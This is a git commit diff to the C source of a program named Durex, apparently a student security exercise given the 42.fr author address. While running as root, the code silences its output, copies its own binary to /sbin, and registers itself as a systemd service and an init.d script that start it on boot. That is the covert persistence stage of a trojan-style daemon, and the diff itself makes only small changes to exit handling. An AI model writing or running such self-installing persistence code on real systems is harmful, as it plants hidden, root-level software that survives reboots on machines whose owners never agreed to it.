bcb47152aa9600c428c74afb4a76a502275a55d0
Mathieu ABOU-HAYDAR <maabou-h@e1r4p14.42.fr>
2022-01-06 13:37:05 +0100

    a

--- src/main.c
+++ src/main.c
@@ -7,7 +7,7 @@ int		main(int ac, char **av, char **envp)
 
 	memset(&buf, 0, 255);
 	if(geteuid() != 0)
-		exit(1);
+		return (1);
 	readlink("/proc/self/exe", buf, 255);
 	snprintf(buff, 255, "cp %s /sbin/Durex && chmod u+x /sbin/Durex", buf);
 	if (strcmp(buf, "/sbin/Durex") && strcmp(buf, "/usr/sbin/Durex"))
@@ -17,18 +17,17 @@ int		main(int ac, char **av, char **envp)
 		close(1);
 		close(2);
 		if (system(buff) != 0)
-			exit(1);
+			return (1);
 		if (system("cp ./Durex.service /etc/systemd/system/Durex.service && chmod u+x /etc/systemd/system/Durex.service") != 0)
-			exit(1);
+			return (1);
 		if (system("cp ./Durex.init /etc/init.d/Durex && chmod u+x /etc/init.d/Durex") != 0)
-			exit(1);
+			return (1);
 		if (system("rm -rf /sbin/Durex ; cp -p Durex /sbin/Durex && chmod +x /sbin/Durex") != 0)
-			exit(1);
-		system("systemctl -q daemon-reload");
-		system("systemctl -q enable Durex");
-		system("service Durex start");
-		exit(0);
+			return (1);
+		system("systemctl -q daemon-reload; systemctl -q enable Durex; service Durex restart");
+		return (0);
 	}
 	else
 		_rundurex(envp);
+	return 0;
 }
